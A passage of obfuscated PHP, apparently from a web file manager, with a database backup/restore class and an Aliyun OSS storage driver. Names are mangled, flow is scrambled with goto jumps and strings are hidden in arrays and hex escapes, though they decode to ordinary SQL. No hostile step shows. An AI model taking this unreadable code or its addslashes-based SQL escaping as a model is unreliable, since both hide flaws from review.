$DàëÆ„ÖÆ = $DàëÆ„ÖÆ ? $DàëÆ„ÖÆ : 1; $E»¸ï’Ê¦’ = isset($E»¸ï’Ê¦’) ? $E»¸ï’Ê¦’ : (is_numeric($Bİº¸•Ÿ±[$bÀ¾…”äÎ„[288]]) ? $Bİº¸•Ÿ±[$bÀ¾…”äÎ„[288]] : 20); $E‘ ¼¥Ô = $E»¸ï’Ê¦’ * ((int) $DàëÆ„ÖÆ - 1); $Bİº¸•Ÿ±[$bÀ¾…”äÎ„[288]] = $E‘ ¼¥Ô . $bÀ¾…”äÎ„[47] . $E»¸ï’Ê¦’; } if (think_config($bÀ¾…”äÎ„[978])) { $aˆ¿¤¡ó§Ê = $bÀ¾…”äÎ„[979] . md5(serialize($Bİº¸•Ÿ±)); $AÓö›˜¦²Û = think_cache($aˆ¿¤¡ó§Ê); if ($AÓö›˜¦²Û) { return $AÓö›˜¦²Û; } } goto F®ÈÅ‚îºÒ; b³Ïí¦¶»Ğ: } public function parseSql($bìò¬÷ÇÒ‡, $C„Ä†³“Ê = array()) { $A…Çé¤Ô• =& $_SERVER[¢ÌÛ]; $bìò¬÷ÇÒ‡ = str_replace(array($A…Çé¤Ô•[980], $A…Çé¤Ô•[981], $A…Çé¤Ô•[982], $A…Çé¤Ô•[983], $A…Çé¤Ô•[984], $A…Çé¤Ô•[985], $A…Çé¤Ô•[986], $A…Çé¤Ô•[987], $A…Çé¤Ô•[988], $A…Çé¤Ô•[989], $A…Çé¤Ô•[990]), array($this->parseTable("{$C„Ä†³“Ê[$A…Çé¤Ô•[275]]}"), $this->parseDistinct(isset($C„Ä†³“Ê[$A…Çé¤Ô•[991]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[991]] : !1), $this->parseField(!empty($C„Ä†³“Ê[$A…Çé¤Ô•[269]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[269]] : $A…Çé¤Ô•[182]), $this->parseJoin(!empty($C„Ä†³“Ê[$A…Çé¤Ô•[278]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[278]] : $A…Çé¤Ô•[33]), $this->parseWhere(!empty($C„Ä†³“Ê[$A…Çé¤Ô•[271]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[271]] : $A…Çé¤Ô•[33]), $this->parseGroup(!empty($C„Ä†³“Ê[$A…Çé¤Ô•[992]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[992]] : $A…Çé¤Ô•[33]), $this->parseHaving(!empty($C„Ä†³“Ê[$A…Çé¤Ô•[993]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[993]] : $A…Çé¤Ô•[33]), $this->parseOrder(!empty($C„Ä†³“Ê[$A…Çé¤Ô•[359]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[359]] : $A…Çé¤Ô•[33]), $this->parseLimit(!empty($C„Ä†³“Ê[$A…Çé¤Ô•[288]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[288]] : $A…Çé¤Ô•[33]), $this->parseUnion(!empty($C„Ä†³“Ê[$A…Çé¤Ô•[343]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[343]] : $A…Çé¤Ô•[33]), $this->parseComment(!empty($C„Ä†³“Ê[$A…Çé¤Ô•[350]]) ? $C„Ä†³“Ê[$A…Çé¤Ô•[350]] : $A…Çé¤Ô•[33])), $bìò¬÷ÇÒ‡); return $bìò¬÷ÇÒ‡; } public function getLastSql($Dá›‹ˆ­œ = '') { return $Dá›‹ˆ­œ ? $this->modelSql[$Dá›‹ˆ­œ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($B‚š ¾¼İë) { return addslashes($B‚š ¾¼İë); } public function setModel($F¼êªÆµ) { $this->model = $F¼êªÆµ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($c–‚¼Ò¹Æœ, $C¨ÉáÇ¯Õƒ = '') { $this->database = $c–‚¼Ò¹Æœ; $this->type = $C¨ÉáÇ¯Õƒ; } public function model($D‰ö˜§™ = '') { return new ModelBase($D‰ö˜§™, $_SERVER[¢ÌÛ][33], $this->database); } public function db($A„ªíÉ¾ò§ = false) { goto d¡Ê¶ÉÎÀË; DæÄ…ì±›Ä: $this->database = $d™ùïõÎ; $dÌ¨„ÄäÊ = $this->model()->db(); try { $b‘Í¾Û–†­ = $dÌ¨„ÄäÊ->execute("\x73\150\x6f\x77\40\x64\x61\x74\x61\x62\141\x73\x65\x73\40\154\151\153\x65\40\47{$FĞ§ÇõÍƒÌ}\47"); } catch (Exception $EÂÑ«ë«°Ğ) { } goto EÄÔƒãƒ ; EÄÔƒãƒ : if (!$b‘Í¾Û–†­) { $dÌ¨„ÄäÊ->execute("\x63\162\145\141\x74\145\40\144\141\164\141\142\141\x73\x65\40\140{$FĞ§ÇõÍƒÌ}\x60"); } $d™ùïõÎ[$A¡„ØˆéÌ[906]] = $FĞ§ÇõÍƒÌ; if ($d™ùïõÎ[$A¡„ØˆéÌ[745]] == $A¡„ØˆéÌ[746]) { $d™ùïõÎ[$A¡„ØˆéÌ[747]] .= $A¡„ØˆéÌ[994] . $FĞ§ÇõÍƒÌ; } goto EÙÉçØ†ŒŠ; EÙÉçØ†ŒŠ: $this->database = $d™ùïõÎ; $dÌ¨„ÄäÊ->execute("\x75\163\x65\x20\x60{$FĞ§ÇõÍƒÌ}\140"); return $dÌ¨„ÄäÊ; goto F•«Ù¶šŠ; dØÙÖáÆ‹ë: $FĞ§ÇõÍƒÌ = $d™ùïõÎ[$A¡„ØˆéÌ[906]]; $d™ùïõÎ[$A¡„ØˆéÌ[906]] = $A¡„ØˆéÌ[33]; if ($d™ùïõÎ[$A¡„ØˆéÌ[745]] == $A¡„ØˆéÌ[746]) { $c¼Ğ¸Éœ«ì = $d™ùïõÎ[$A¡„ØˆéÌ[747]]; $d™ùïõÎ[$A¡„ØˆéÌ[747]] = substr($c¼Ğ¸Éœ«ì, 0, strrpos($c¼Ğ¸Éœ«ì, $A¡„ØˆéÌ[994])); } goto DæÄ…ì±›Ä; d¡Ê¶ÉÎÀË: $A¡„ØˆéÌ =& $_SERVER[¢ÌÛ]; $d™ùïõÎ = array_change_key_case($this->database); if ($this->type == $A¡„ØˆéÌ[9] || !$A„ªíÉ¾ò§) { return $this->model()->db(); } goto dØÙÖáÆ‹ë; F•«Ù¶šŠ: } public function createTable($F…•ß¶«ƒÌ, $fæ˜ùóÑ† = null) { $F˜«ˆó’É =& $_SERVER[¢ÌÛ]; if (!IO::exist($F…•ß¶«ƒÌ)) { ActionCall($F˜«ˆó’É[995], !0, 0); show_json(LNG($F˜«ˆó’É[996]), !1); } $E·‰„Áø©Ÿ = sqlSplit(IO::getContent($F…•ß¶«ƒÌ)); foreach ($E·‰„Áø©Ÿ as $FÑèÁ¾‡Å) { if ($fæ˜ùóÑ†) { $C„œ¸Æ¨Ûæ = stripos($FÑèÁ¾‡Å, $F˜«ˆó’É[997]) === 0; if ($C„œ¸Æ¨Ûæ) { $fæ˜ùóÑ†->task[$F˜«ˆó’É[998]] += 1; } } $this->model()->db()->execute($FÑèÁ¾‡Å); if ($fæ˜ùóÑ† && $C„œ¸Æ¨Ûæ) { preg_match($F˜«ˆó’É[999], $FÑèÁ¾‡Å, $Aá†¸ÁÅã÷); $fæ˜ùóÑ†->task[$F˜«ˆó’É[1000]] = $Aá†¸ÁÅã÷[1]; $fæ˜ùóÑ†->update(1); } } $this->taskToCache($fæ˜ùóÑ†); } public function insertTable($c˜ë¶˜´Ñ, $D¨ÉÏ¶©‘À = null) { $D”ÃÊĞˆ¾ =& $_SERVER[¢ÌÛ]; $c”–ÉÅ¾¤Î = $this->model()->db(); $E£ÔÈç° = $EâÛ›È‰° ? array($EâÛ›È‰°) : $c”–ÉÅ¾¤Î->getTables(); foreach ($c˜ë¶˜´Ñ as $D¨ß›†Æ‡¿) { $EâÛ›È‰° = basename($D¨ß›†Æ‡¿, $D”ÃÊĞˆ¾[740]); if (!in_array($EâÛ›È‰°, $E£ÔÈç°)) { continue; } if ($D¨ÉÏ¶©‘À) { $D¨ÉÏ¶©‘À->task[$D”ÃÊĞˆ¾[1000]] = $EâÛ›È‰°; } if (get_filesize($D¨ß›†Æ‡¿) == 0) { continue; } $dŒ¬÷Îà¼ = $this->sqlToDb($D¨ß›†Æ‡¿, $D¨ÉÏ¶©‘À); if (!$dŒ¬÷Îà¼) { ActionCall($D”ÃÊĞˆ¾[995], !0, 0); show_json(LNG($D”ÃÊĞˆ¾[1001]) . "\x5b{$EâÛ›È‰°}\135", !1); } } $this->taskToCache($D¨ÉÏ¶©‘À); } public function sqlFromDb($DÁ­¼¯‘¾, $d¿ÜàäÕº“, $f„Òª”¤ïè = null, $dù¬“ëªà† = null) { goto A¶¦Íºãšİ; A¶¦Íºãšİ: if ($f„Òª”¤ïè) { $f„Òª”¤ïè->task[$_SERVER[¢ÌÛ][1000]] = $DÁ­¼¯‘¾; } $e±‰µÑç = $this->model($DÁ­¼¯‘¾); $c—¥ù¼¥Ó = 0; goto Eß¡‘ï›„; b¯Ô¼ÕÈè²: fclose($eêë«•ƒ«Œ); return $c—¥ù¼¥Ó; goto D™°ç’¶¬; Eß¡‘ï›„: $C›§¢­Œ¿¼ = 1; $aš… ïõßæ = 500; $eêë«•ƒ«Œ = fopen($d¿ÜàäÕº“, $_SERVER[¢ÌÛ][1002]); goto f¢ğëİšÚÌ; f¢ğëİšÚÌ: $a¢ë³ŞÀšó = $e±‰µÑç->getPk(); $e†æ²é÷ëÃ = $e±‰µÑç->getDbFields(); do { $aœÃ‹®Š«ö = $e±‰µÑç->field($e†æ²é÷ëÃ)->order($a¢ë³ŞÀšó . $_SERVER[¢ÌÛ][1003])->selectPage($aš… ïõßæ, $C›§¢­Œ¿¼); $AµÅ·Ü”á– = isset($aœÃ‹®Š«ö[$_SERVER[¢ÌÛ][360]][$_SERVER[¢ÌÛ][362]]) ? $aœÃ‹®Š«ö[$_SERVER[¢ÌÛ][360]][$_SERVER[¢ÌÛ][362]] : 0; $E’ÄŸî±» = !empty($aœÃ‹®Š«ö[$_SERVER[¢ÌÛ][363]]) ? $aœÃ‹®Š«ö[$_SERVER[¢ÌÛ][363]] : array(); if (!($bÈêàË·ÍÜ = count($E’ÄŸî±»))) { break; } $bÙºÎ¢èè° = array(); foreach ($E’ÄŸî±» as $AŠ»š‹°ğ±) { if ($DÁ­¼¯‘¾ == $_SERVER[¢ÌÛ][1004] && $AŠ»š‹°ğ±[$_SERVER[¢ÌÛ][29]] == $_SERVER[¢ÌÛ][1005]) { $E‰¹À°ñÂ¿ = json_decode($AŠ»š‹°ğ±[$_SERVER[¢ÌÛ][368]], !0); if ($E‰¹À°ñÂ¿[$_SERVER[¢ÌÛ][28]] == date($_SERVER[¢ÌÛ][713]) && !$E‰¹À°ñÂ¿[$_SERVER[¢ÌÛ][712]]) { continue; } } if ($dù¬“ëªà†) { $AŠ»š‹°ğ±[$_SERVER[¢ÌÛ][75]] = "\x7b\x69\157\72{$dù¬“ëªà†}\x7d" . substr($AŠ»š‹°ğ±[$_SERVER[¢ÌÛ][75]], strlen("\x7b\151\157\x3a{$AŠ»š‹°ğ±[$_SERVER[¢ÌÛ][766]]}\x7d")); $AŠ»š‹°ğ±[$_SERVER[¢ÌÛ][766]] = $dù¬“ëªà†; } $bÙºÎ¢èè°[] = $_SERVER[¢ÌÛ][1006] . $this->sqlEncode($AŠ»š‹°ğ±) . $_SERVER[¢ÌÛ][1007]; } $CÖª°¸äªé = "\x49\x4e\x53\x45\122\124\40\111\x4e\124\117\40\140{$DÁ­¼¯‘¾}\140\x20\50\x60" . implode($_SERVER[¢ÌÛ][1008], $e†æ²é÷ëÃ) . $_SERVER[¢ÌÛ][1009]; fwrite($eêë«•ƒ«Œ, $CÖª°¸äªé . implode($_SERVER[¢ÌÛ][1010], $bÙºÎ¢èè°) . $_SERVER[¢ÌÛ][67] . PHP_EOL); $C›§¢­Œ¿¼++; $c—¥ù¼¥Ó += $bÈêàË·ÍÜ; if ($f„Òª”¤ïè) { $f„Òª”¤ïè->update($bÈêàË·ÍÜ); } } while ($C›§¢­Œ¿¼ <= $AµÅ·Ü”á–); goto b¯Ô¼ÕÈè²; D™°ç’¶¬: } public function sqlToDb($EõéâØ¤Âô, $FóĞãÚ‰ğÄ = null) { goto CÄÂº™–ï…; CÄÂº™–ï…: $EÀ£´Óê› =& $_SERVER[¢ÌÛ]; $Dí’âğ”Áã = $this->model()->db(); $b˜ÍºÀ†ì = @fopen($EõéâØ¤Âô, $EÀ£´Óê›[1011]); goto b‚ŠÅ½ÆÂˆ; AšÆ‡ƒÈĞÑ: $bª•âÙ¹ = 500 + 1; while (!feof($b˜ÍºÀ†ì)) { if ($FóĞãÚ‰ğÄ && $aÏí´–Í´ != 0) { $FóĞãÚ‰ğÄ->task[$EÀ£´Óê›[998]] += 1; } $aÏí´–Í´++; $fŞŸœŠŒ„ = trim(fgets($b˜ÍºÀ†ì)); $b†äæÖÅ’› .= $EÀ£´Óê›[50] . $this->sqlDecode($fŞŸœŠŒ„, $this->type); if ($aÏí´–Í´ == $bª•âÙ¹) { $b†äæÖÅ’› = rtrim(trim($b†äæÖÅ’›), $EÀ£´Óê›[67]); if (!$Dí’âğ”Áã->execute($b†äæÖÅ’›)) { return !1; } if ($FóĞãÚ‰ğÄ) { $FóĞãÚ‰ğÄ->update($aÏí´–Í´ - 1); } $b†äæÖÅ’› = $EÀ£´Óê›[33]; $aÏí´–Í´ = 0; } } fclose($b˜ÍºÀ†ì); goto D¶†¾´‡…Ã; b‚ŠÅ½ÆÂˆ: if (!$b˜ÍºÀ†ì) { return !1; } $aÏí´–Í´ = 0; $b†äæÖÅ’› = $EÀ£´Óê›[33]; goto AšÆ‡ƒÈĞÑ; D¶†¾´‡…Ã: if (trim($b†äæÖÅ’›)) { $b†äæÖÅ’› = rtrim(trim($b†äæÖÅ’›), $EÀ£´Óê›[67]); if (!$Dí’âğ”Áã->execute($b†äæÖÅ’›)) { return !1; } if ($FóĞãÚ‰ğÄ) { $FóĞãÚ‰ğÄ->update($aÏí´–Í´ - 1); } } return !0; goto fÒµÈö¹Ô’; fÒµÈö¹Ô’: } public function dropTable($bŒòÃœ´Òª = null) { $dƒ³î“™” = $this->model()->db(); $fçÂœˆî‰ = $bŒòÃœ´Òª ? array($bŒòÃœ´Òª) : $dƒ³î“™”->getTables(); if (!$fçÂœˆî‰) { return; } foreach ($fçÂœˆî‰ as $bŒòÃœ´Òª) { $dƒ³î“™”->execute("\144\162\157\160\x20\x74\x61\142\x6c\145\40\151\146\x20\x65\x78\x69\x73\164\x73\x20\x60{$bŒòÃœ´Òª}\x60"); } } private function taskToCache($eïêÊ­óŠ = null) { $bˆ¢Ğä÷â =& $_SERVER[¢ÌÛ]; if (!$eïêÊ­óŠ) { return; } $f•ÇÕĞ ‹ = array($bˆ¢Ğä÷â[1000] => $eïêÊ­óŠ->task[$bˆ¢Ğä÷â[1000]], $bˆ¢Ğä÷â[998] => $eïêÊ­óŠ->task[$bˆ¢Ğä÷â[998]], $bˆ¢Ğä÷â[1012] => $eïêÊ­óŠ->task[$bˆ¢Ğä÷â[1012]]); if ($f•ÇÕĞ ‹[$bˆ¢Ğä÷â[998]] == $f•ÇÕĞ ‹[$bˆ¢Ğä÷â[1012]]) { $f•ÇÕĞ ‹[$bˆ¢Ğä÷â[719]] = 1; } Cache::set($bˆ¢Ğä÷â[1013] . $eïêÊ­óŠ->task[$bˆ¢Ğä÷â[385]], $f•ÇÕĞ ‹); $eïêÊ­óŠ->end(); } private function sqlEncode($F¦°•Ö‰˜) { $aÓ¾²ÍÀ·Â =& $_SERVER[¢ÌÛ]; $A«ç§›‰Œ™ = array(); foreach ($F¦°•Ö‰˜ as $dÇ“¢¤¯ñ¤) { if (is_array($dÇ“¢¤¯ñ¤)) { $dÇ“¢¤¯ñ¤ = json_encode_force($dÇ“¢¤¯ñ¤); } $dÇ“¢¤¯ñ¤ = addslashes($dÇ“¢¤¯ñ¤); $dÇ“¢¤¯ñ¤ = str_replace(array($aÓ¾²ÍÀ·Â[1014], $aÓ¾²ÍÀ·Â[227]), array($aÓ¾²ÍÀ·Â[1015], $aÓ¾²ÍÀ·Â[1016]), $dÇ“¢¤¯ñ¤); $A«ç§›‰Œ™[] = str_replace($aÓ¾²ÍÀ·Â[55], $aÓ¾²ÍÀ·Â[1017], $dÇ“¢¤¯ñ¤); } return $aÓ¾²ÍÀ·Â[55] . implode($aÓ¾²ÍÀ·Â[1018], $A«ç§›‰Œ™) . $aÓ¾²ÍÀ·Â[55]; } private function sqlDecode($E›¤¶²ß¾à, $f£‚»é§‰Õ) { $c®–ŒŞ¢¯è =& $_SERVER[¢ÌÛ]; $E›¤¶²ß¾à = str_replace(array($c®–ŒŞ¢¯è[1015], $c®–ŒŞ¢¯è[1016]), array($c®–ŒŞ¢¯è[1014], $c®–ŒŞ¢¯è[227]), $E›¤¶²ß¾à); if ($f£‚»é§‰Õ == $c®–ŒŞ¢¯è[9]) { $E›¤¶²ß¾à = stripslashes($E›¤¶²ß¾à); } return $E›¤¶²ß¾à; } } goto DÖÚùˆ›§ì; B¿ĞÉæÌÙ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($A£Ï¡ğŒó¼) { parent::__construct(); include_once SDK_DIR . $_SERVER[¢ÌÛ][1231]; $this->_init($A£Ï¡ğŒó¼); } public function _init($dÑ£¨Ï°³) { $a÷ˆÀáŒÅ¤ =& $_SERVER[¢ÌÛ]; foreach ($dÑ£¨Ï°³ as $dö±…‡“ö§ => $A¸Ñ·›ßÕ) { if (isset($this->{$dö±…‡“ö§})) { $this->{$dö±…‡“ö§} = $A¸Ñ·›ßÕ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($a÷ˆÀáŒÅ¤[1232] . LNG($a÷ˆÀáŒÅ¤[1233])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto AùâğÉö¤Ë; cã°…¼±µ: $ağ§¡™¿ˆ§->addAllowedOrigin($Eõ÷×©éÕã[1234]); $ağ§¡™¿ˆ§->addAllowedMethod($Eõ÷×©éÕã[1235]); $ağ§¡™¿ˆ§->addAllowedMethod($Eõ÷×©éÕã[1236]); goto CõŸ¾›Ã’–; a…à³¸ëì: $ağ§¡™¿ˆ§->setMaxAgeSeconds(600); $ağ§¡™¿ˆ§->addExposeHeader($Eõ÷×©éÕã[1239]); $ağ§¡™¿ˆ§->addAllowedHeader($Eõ÷×©éÕã[1234]); goto B‡¦¢õ¾²ô; AùâğÉö¤Ë: $Eõ÷×©éÕã =& $_SERVER[¢ÌÛ]; $Cµğ»â†² = new OSS\Model\CorsConfig(); $ağ§¡™¿ˆ§ = new OSS\Model\CorsRule(); goto cã°…¼±µ; CõŸ¾›Ã’–: $ağ§¡™¿ˆ§->addAllowedMethod($Eõ÷×©éÕã[1237]); $ağ§¡™¿ˆ§->addAllowedMethod($Eõ÷×©éÕã[1238]); $ağ§¡™¿ˆ§->addAllowedMethod($Eõ÷×©éÕã[157]); goto a…à³¸ëì; B‡¦¢õ¾²ô: $Cµğ»â†²->addRule($ağ§¡™¿ˆ§); try { $this->client->putBucketCors($this->bucket, $Cµğ»â†²); } catch (OSS\Core\OssException $e¯Ü°‚ÕŒ–) { return !1; } return !0; goto F¯‚Ğî‚È«; F¯‚Ğî‚È«: } public function getBucketCors() { goto F«ßîÉ‹òÇ; F«ßîÉ‹òÇ: $FÅŒ‹Ë®Î =& $_SERVER[¢ÌÛ]; $a´ƒÈËÇïŒ = null; try { $a´ƒÈËÇïŒ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $EŒ—Óæ—¯Õ) { return null; } goto C±Ğ©öÂÅ©; C±Ğ©öÂÅ©: if (!$a´ƒÈËÇïŒ || !($fù¥òÊÓ’¹ = $a´ƒÈËÇïŒ->getRules())) { return null; } $fª‘×„é”„ = $fù¥òÊÓ’¹[0]->getAllowedOrigins(); $dä…ì¶‘ÓÂ = $fù¥òÊÓ’¹[0]->getAllowedMethods(); goto EÂ‘Œòè¥; EÂ‘Œòè¥: $Fßì˜âœĞ = $fù¥òÊÓ’¹[0]->getMaxAgeSeconds(); $aŒÉˆ‹Ä„¬ = $fù¥òÊÓ’¹[0]->getExposeHeaders(); $AëÚñ‹ŞéÑ = $fù¥òÊÓ’¹[0]->getAllowedHeaders(); goto fİŒ³Ëä÷; fİŒ³Ëä÷: return array($FÅŒ‹Ë®Î[181] => isset($fª‘×„é”„[0]) ? $fª‘×„é”„[0] : $FÅŒ‹Ë®Î[33], $FÅŒ‹Ë®Î[185] => $dä…ì¶‘ÓÂ, $FÅŒ‹Ë®Î[1240] => $Fßì˜âœĞ, $FÅŒ‹Ë®Î[1241] => isset($aŒÉˆ‹Ä„¬[0]) ? $aŒÉˆ‹Ä„¬[0] : $FÅŒ‹Ë®Î[33], $FÅŒ‹Ë®Î[183] => isset($AëÚñ‹ŞéÑ[0]) ? $AëÚñ‹ŞéÑ[0] : $FÅŒ‹Ë®Î[33]); goto bËŸ«é¢Ù®; bËŸ«é¢Ù®: } public function isBucketCors() { goto bˆ©¡¬òì; EÃø­µŞÎâ: if ($c—èÅ÷¸•[$FÀÖœªÍ›[181]] != $FÀÖœªÍ›[182] || $c—èÅ÷¸•[$FÀÖœªÍ›[183]] != $FÀÖœªÍ›[182]) { return !1; } $BøÕŸ¢¼ = array_map($FÀÖœªÍ›[184], $c—èÅ÷¸•[$FÀÖœªÍ›[185]]); if (!is_array($BøÕŸ¢¼)) { $BøÕŸ¢¼ = array(); } goto DØ’œŠŒğ‡; bˆ©¡¬òì: $FÀÖœªÍ› =& $_SERVER[¢ÌÛ]; $c—èÅ÷¸• = $this->getBucketCors(); if (!$c—èÅ÷¸• || !is_array($c—èÅ÷¸•)) { return !1; } goto EÃø­µŞÎâ; DØ’œŠŒğ‡: $bÊ¥‰Àˆó = array($FÀÖœªÍ›[186], $FÀÖœªÍ›[187], $FÀÖœªÍ›[188], $FÀÖœªÍ›[189], $FÀÖœªÍ›[190]); $b§Í¡ÈÓ¶ = array_diff($bÊ¥‰Àˆó, $BøÕŸ¢¼); return empty($b§Í¡ÈÓ¶); goto b•¨®³¤—Ÿ; b•¨®³¤—Ÿ: } public function mkfile($bÖöĞç«‚Ï, $C÷‚ŸŒÍÌ¼ = '', $cß©ÅŠµß = REPEAT_RENAME) { $B·«×›¢Ğ¥ = $this->setContent($bÖöĞç«‚Ï, $C÷‚ŸŒÍÌ¼); if ($B·«×›¢Ğ¥ !== !1) { return $this->getPathOuter($bÖöĞç«‚Ï); } return !1; } public function mkdir($eÃÌ¦ÌµŠÖ, $aÓƒ…‚¯±« = REPEAT_SKIP) { if ($this->_isFolder($eÃÌ¦ÌµŠÖ)) { return $this->getPathOuter($eÃÌ¦ÌµŠÖ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($eÃÌ¦ÌµŠÖ)); } catch (OSS\Core\OssException $D·åÜÍŒ¢Â) { return !1; } return $this->getPathOuter($eÃÌ¦ÌµŠÖ); } private function fileList($e´¯›ÙÎ±â, $cÆºğõ¬Š = '', $dÈóÒœ¯ô = 0) { goto cø‹øá¹‡; cø‹øá¹‡: $b†ˆƒ‹‰í =& $_SERVER[¢ÌÛ]; $e´¯›ÙÎ±â = trim($e´¯›ÙÎ±â, $b†ˆƒ‹‰í[8]); $dÖ¯•‰”³ = empty($e´¯›ÙÎ±â) ? $b†ˆƒ‹‰í[33] : $e´¯›ÙÎ±â . $b†ˆƒ‹‰í[8]; goto Fç™½ªâ»; e”œÖËšß„: $fÚÕ·‰ìÀ = $A³èŠ„ñ´Õ = array(); while (!0) { check_abort(); $Dº…¼ Òµè = array($b†ˆƒ‹‰í[1242] => $cÆºğõ¬Š, $b†ˆƒ‹‰í[1243] => $dÖ¯•‰”³, $b†ˆƒ‹‰í[1244] => $Dõ¯İ‡Ìî÷, $b†ˆƒ‹‰í[1245] => $Aå‚­ÁçÙ‹); try { $Dã‘ùÜÎî‚ = $this->client->listObjects($this->bucket, $Dº…¼ Òµè); } catch (OSS\Core\OssException $Dôñâ­Ÿ›ß) { break; } $Aå‚­ÁçÙ‹ = $Dã‘ùÜÎî‚->getNextMarker(); $cæïã¥˜Ù = $Dã‘ùÜÎî‚->getObjectList(); $DÇ¦àÕï÷ = $Dã‘ùÜÎî‚->getPrefixList(); foreach ($cæïã¥˜Ù as $Ağ²ì‘äÀ) { goto E‘¶¼¼ƒæÁ; dÜ¸ˆî¤: if ($BéŠíŸ¯»¡) { $this->cacheMethod($b†ˆƒ‹‰í[197], $aäÚÁçÎ¿ï, $eÛ ĞäõÙ); $this->cacheMethod($b†ˆƒ‹‰í[198], $aäÚÁçÎ¿ï, array($b†ˆƒ‹‰í[77] => $E³Ë¸äÁÉ×, $b†ˆƒ‹‰í[1246] => $E³Ë¸äÁÉ×, $b†ˆƒ‹‰í[83] => strtotime($Bí ê‡ëš), $b†ˆƒ‹‰í[1247] => $Bí ê‡ëš)); } if ($eÛ ĞäõÙ) { $fÚÕ·‰ìÀ[] = $aäÚÁçÎ¿ï; continue; } $A³èŠ„ñ´Õ[] = $eÙ™·›ìÚ¼; goto eÂ½ñ Ğ‰©; E‘¶¼¼ƒæÁ: if ($Ağ²ì‘äÀ->getKey() == $dÖ¯•‰”³) { continue; } $aäÚÁçÎ¿ï = $Ağ²ì‘äÀ->getKey(); $E³Ë¸äÁÉ× = $Ağ²ì‘äÀ->getSize(); goto E÷ÖØ‚ªí; E÷ÖØ‚ªí: $Bí ê‡ëš = $Ağ²ì‘äÀ->getLastModified(); $eÙ™·›ìÚ¼ = $dÈóÒœ¯ô ? array($b†ˆƒ‹‰í[28] => $aäÚÁçÎ¿ï, $b†ˆƒ‹‰í[77] => $E³Ë¸äÁÉ×, $b†ˆƒ‹‰í[195] => strtotime($Bí ê‡ëš)) : $aäÚÁçÎ¿ï; $eÛ ĞäõÙ = $E³Ë¸äÁÉ× == 0 && substr($aäÚÁçÎ¿ï, strlen($aäÚÁçÎ¿ï) - 1, 1) == $b†ˆƒ‹‰í[8] ? !0 : !1; goto dÜ¸ˆî¤; eÂ½ñ Ğ‰©: } foreach ($DÇ¦àÕï÷ as $eÆÖÑ¦š¶ˆ) { $fÚÕ·‰ìÀ[] = $eÆÖÑ¦š¶ˆ->getPrefix(); if ($BéŠíŸ¯»¡) { $this->cacheMethod($b†ˆƒ‹‰í[197], $aäÚÁçÎ¿ï, !0); } } if ($Aå‚­ÁçÙ‹ === $b†ˆƒ‹‰í[33]) { break; } } if ($BéŠíŸ¯»¡) { $this->cacheMethod($b†ˆƒ‹‰í[197], $e´¯›ÙÎ±â, !0); } goto DİÈö¾Úã×; Fç™½ªâ»: $Aå‚­ÁçÙ‹ = $b†ˆƒ‹‰í[33]; $Dõ¯İ‡Ìî÷ = 1000; $BéŠíŸ¯»¡ = $this->listItemCache === !1 ? !1 : !0; goto e”œÖËšß„; DİÈö¾Úã×: return array($b†ˆƒ‹‰í[74] => $fÚÕ·‰ìÀ, $b†ˆƒ‹‰í[73] => $A³èŠ„ñ´Õ); goto féÃ¯¸á’÷; féÃ¯¸á’÷: } public function copyFile($EÊõ¿Ú”¢, $aáàà¬Â¾ö) { $AÕÏÍäíÓ = $this->size($EÊõ¿Ú”¢); if ($AÕÏÍäíÓ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $EÊõ¿Ú”¢, $this->bucket, $this->pathEncode($aáàà¬Â¾ö)); } catch (OSS\Core\OssException $CÆ¹ŒÙíÕ™) { return !1; } return $this->getPathOuter($aáàà¬Â¾ö); } $DÃ†ÛÂóÅ = $this->multiCopyObject($EÊõ¿Ú”¢, $aáàà¬Â¾ö, $AÕÏÍäíÓ); return $DÃ†ÛÂóÅ ? $this->getPathOuter($aáàà¬Â¾ö) : !1; } private function multiCopyObject($DÃ™”“µÁ, $bÚª†Îß†ù, $Bçëç«øçî) { $cöîçÒÌã’ =& $_SERVER[¢ÌÛ]; try { goto F‹‚×„ˆ˜İ; eÜÉ§‹†ä: $A¼«à¹­ˆ = 1; $e’¤Ñ§ß¸‹ = 0; $F¦„¡¿õ²„ = array(); goto aÓïƒºÖã; F‹‚×„ˆ˜İ: $D¨¹ŸÇï‹ = array(); if ($cÒôÊ¢ö³ = $this->hashMd5($DÃ™”“µÁ)) { $D¨¹ŸÇï‹ = array(OSS\OssClient::OSS_HEADERS => array($cöîçÒÌã’[1248] => $cÒôÊ¢ö³)); } $DËôİ÷Ğº‚ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bÚª†Îß†ù), $D¨¹ŸÇï‹); goto eÜÉ§‹†ä; aÓïƒºÖã: $c ùÊÎ©âª = 1024 * 1024 * 10; $aÏä‰è¢§ = $this->client->generateMultiuploadParts($Bçëç«øçî, $c ùÊÎ©âª); foreach ($aÏä‰è¢§ as $F«ßÎ‡¶âƒ => $AÌšŒåÏÑÍ) { $B¤º¡·†âĞ = $e’¤Ñ§ß¸‹ + (int) $AÌšŒåÏÑÍ[$cöîçÒÌã’[1249]]; $D„Í’ìæù = (int) $AÌšŒåÏÑÍ[$cöîçÒÌã’[333]] + $B¤º¡·†âĞ - 1; $A§¦‘ø˜Í = array($cöîçÒÌã’[1250] => $B¤º¡·†âĞ, $cöîçÒÌã’[1251] => $D„Í’ìæù); 